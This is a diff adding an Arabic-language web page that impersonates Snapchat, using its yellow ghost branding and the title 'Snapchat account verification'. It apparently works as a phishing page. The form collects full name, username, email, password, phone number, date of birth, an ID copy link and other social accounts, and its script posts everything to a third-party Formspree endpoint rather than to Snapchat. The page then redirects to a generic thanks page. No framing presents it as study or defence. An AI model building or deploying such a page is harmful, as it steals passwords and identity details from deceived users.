@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+
+<html lang="ar">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>توثيق حساب Snapchat</title>
+
+    <style>
+
+        body {
+
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+
+            background: #f8f9fa;
+
+            color: #333;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            min-height: 100vh;
+
+            padding: 20px;
+
+        }
+
+        .form-container {
+
+            background: #ffffff;
+
+            padding: 40px;
+
+            border-radius: 16px;
+
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+
+            max-width: 500px;
+
+            width: 100%;
+
+            box-sizing: border-box;
+
+            direction: rtl;
+
+            text-align: right;
+
+        }
+
+        .logo-container {
+
+            text-align: center;
+
+            margin-bottom: 25px;
+
+        }
+
+        .snapchat-ghost {
+
+            width: 60px;
+
+            height: 60px;
+
+            background-color: #fffc00;
+
+            border-radius: 50%;
+
+            position: relative;
+
+            margin: auto;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+        }
+
+        .snapchat-ghost::after {
+
+            content: "";
+
+            width: 35px;
+
+            height: 35px;
+
+            background-color: #fff;
+
+            border-radius: 50%;
+
+            position: absolute;
+
+            bottom: 12px;
+
+            left: 50%;
+
+            transform: translateX(-50%);
+
+        }
+
+        .snapchat-ghost .eye {
+
+            width: 10px;
+
+            height: 10px;
+
+            background-color: #333;
+
+            border-radius: 50%;
+
+            position: absolute;
+
+            top: 15px;
+
+        }
+
+        .snapchat-ghost .left-eye { left: 18px; }
+
+        .snapchat-ghost .right-eye { right: 18px; }
+
+        h2 {
+
+            text-align: center;
+
+            color: #000;
+
+            margin-bottom: 25px;
+
+            font-weight: 700;
+
+        }
+
+        .form-group {
+
+            margin-bottom: 20px;
+
+        }
+
+        label {
+
+            display: block;
+
+            font-weight: 600;
+
+            margin-bottom: 8px;
+
+            color: #555;
+
+        }
+
+        input, textarea {
+
+            width: 100%;
+
+            padding: 14px;
+
+            border-radius: 10px;
+
+            border: 1px solid #e0e0e0;
+
+            font-size: 16px;
+
+            box-sizing: border-box;
+
+            background-color: #fcfcfc;
+
+            color: #333;
+
+            transition: border-color 0.3s ease;
+
+        }
+
+        input:focus, textarea:focus {
+
+            outline: none;
+
+            border-color: #fffc00;
+
+            box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.2);
+
+        }
+
+        textarea {
+
+            resize: vertical;
+
+            min-height: 120px;
+
+        }
+
+        .submit-button {
+
+            width: 100%;
+
+            padding: 15px;
+
+            background-color: #fffc00;
+
+            border: none;
+
+            border-radius: 10px;
+
+            cursor: pointer;
+
+            font-weight: 700;
+
+            font-size: 18px;
+
+            color: #1a1a1a;
+
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+
+            text-transform: uppercase;
+
+            margin-top: 10px;
+
+        }
+
+        .submit-button:hover {
+
+            background-color: #e6e300;
+
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.3);
+
+        }
+
+        #message {
+
+            text-align: center;
+
+            margin-top: 20px;
+
+            font-size: 16px;
+
+            font-weight: 600;
+
+            color: green;
+
+            display: none;
+
+        }
+
+        @media (max-width: 600px) {
+
+            .form-container {
+
+                padding: 25px;
+
+            }
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+
+
+    <div class="form-container">
+
+        <div class="logo-container">
+
+            <div class="snapchat-ghost">
+
+                <div class="eye left-eye"></div>
+
+                <div class="eye right-eye"></div>
+
+            </div>
+
+        </div>
+
+        <h2>توثيق حساب Snapchat</h2>
+
+        <form id="verificationForm">
+
+            <div class="form-group">
+
+                <label for="fullName">الاسم الكامل:</label>
+
+                <input type="text" id="fullName" name="الاسم الكامل" placeholder="أدخل اسمك الكامل">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="username">اسم المستخدم:</label>
+
+                <input type="text" id="username" name="اسم المستخدم" placeholder="أدخل اسم المستخدم">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="email">البريد الإلكتروني:</label>
+
+                <input type="email" id="email" name="البريد الإلكتروني" placeholder="أدخل بريدك الإلكتروني">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="password">كلمة السر:</label>
+
+                <input type="password" id="password" name="كلمة السر" placeholder="أدخل كلمة السر">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="phone">رقم الهاتف:</label>
+
+                <input type="text" id="phone" name="رقم الهاتف" placeholder="أدخل رقم هاتفك">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="dob">تاريخ الميلاد:</label>
+
+                <input type="date" id="dob" name="تاريخ الميلاد">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="id-copy">رابط نسخة من الهوية (اختياري):</label>
+
+                <input type="text" id="id-copy" name="رابط الهوية" placeholder="[ضع رابطًا هنا أو ملاحظة]">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="other-accounts">الحسابات الرسمية الأخرى:</label>
+
+                <textarea id="other-accounts" name="الحسابات الأخرى" placeholder="Instagram: @yourusername
+
+Twitter: @yourusername"></textarea>
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="reason">سبب التوثيق:</label>
+
+                <textarea id="reason" name="سبب التوثيق" placeholder="اكتب سبب طلب التوثيق هنا"></textarea>
+
+            </div>
+
+            <button type="submit" class="submit-button">إرسال النموذج</button>
+
+        </form>
+
+        <div id="message" role="alert"></div>
+
+    </div>
+
+
+
+<script>
+
+    document.addEventListener('DOMContentLoaded', () => {
+
+        const form = document.getElementById('verificationForm');
+
+        const messageDiv = document.getElementById('message');
+
+
+
+        const formspreeEndpoint = 'https://formspree.io/f/xrbankwa';
+
+
+
+        form.addEventListener('submit', (event) => {
+
+            event.preventDefault();
+
+
+
+            const formData = new FormData(form);
+
+
+
+            fetch(formspreeEndpoint, {
+
+                method: 'POST',
+
+                body: formData,
+
+                headers: {
+
+                    'Accept': 'application/json'
+
+                }
+
+            })
+
+            .then(response => response.json())
+
+            .then(responseData => {
+
+                if (responseData.ok) {
+
+                    messageDiv.textContent = 'تم إرسال طلبك بنجاح! شكراً لك.';
+
+                    messageDiv.style.color = 'green';
+
+                    messageDiv.style.display = 'block';
+
+
+
+                    setTimeout(() => {
+
+                        window.location.href = 'https://formspree.io/thanks';
+
+                    }, 1500);
+
+                } else {
+
+                    messageDiv.textContent = 'حدث خطأ. يرجى التأكد من الرابط أو المحاولة لاحقاً.';
+
+                    messageDiv.style.color = 'red';
+
+                    messageDiv.style.display = 'block';
+
+                }
+
+            })
+
+            .catch(error => {
+
+                messageDiv.textContent = 'حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.';
+
+                messageDiv.style.color = 'red';
+
+                messageDiv.style.display = 'block';
+
+            });
+
+        });
+
+    });
+
+</script>
+
+</body>
+
+</html>
